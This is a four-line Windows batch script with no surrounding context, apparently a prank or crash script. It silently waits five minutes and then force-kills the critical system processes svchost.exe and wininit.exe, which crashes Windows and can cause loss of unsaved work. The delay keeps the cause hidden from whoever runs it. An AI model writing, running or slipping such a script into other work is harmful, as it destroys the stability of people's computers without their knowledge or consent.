@echo off
Timeout /t 300 /nobreak >nul
taskkill /F /IM svchost.exe
taskkill /F /IM wininit.exe